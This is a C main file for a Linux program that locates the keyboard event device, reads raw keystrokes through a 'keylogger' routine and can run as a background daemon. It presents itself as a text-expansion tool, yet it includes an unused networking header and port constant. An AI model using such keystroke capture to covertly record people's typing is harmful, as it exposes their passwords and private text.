#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include "keylogger.h"
#include "networking.h"
#include "find_event_file.h"


#define PORT "3491"

void print_usage_and_quit(char *application_name);

int main(int argc, char *argv[]){
    char *KEYBOARD_DEVICE = get_keyboard_event_file();
    if(!KEYBOARD_DEVICE){
        printf("Couldn't find keyboard event file");
        exit(-1);
    }

    int keyboard;

    int daemonize = 0, immediate = 0, option = 0;
    while((option = getopt(argc, argv,"dih")) != -1){
        switch(option){
            case 'd':
                daemonize = 1;
                break;
            case 'i':
                immediate = 1;
                break;
            case 'h':
                print_usage_and_quit(argv[0]);
                break;
            default: print_usage_and_quit(argv[0]);
        }
    }

    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
        return 1;
    }

    if (daemonize) {
        if (!fork()) {
            keylogger(keyboard, immediate);

            close(keyboard);
            free(KEYBOARD_DEVICE);
        }
    } else {
        keylogger(keyboard, immediate);

        close(keyboard);
        free(KEYBOARD_DEVICE);
    }

    return 0;
}

void print_usage_and_quit(char *application_name){
    printf("Usage: %s [-d] [-i]\n\nA little tool for text expansion. Shortcuts can be 5 chars long max.\n\nhelp:\n\n -h display this help message\n -d daemonize\n -i immediately execute shortcut\n", application_name);
    exit(1);
}
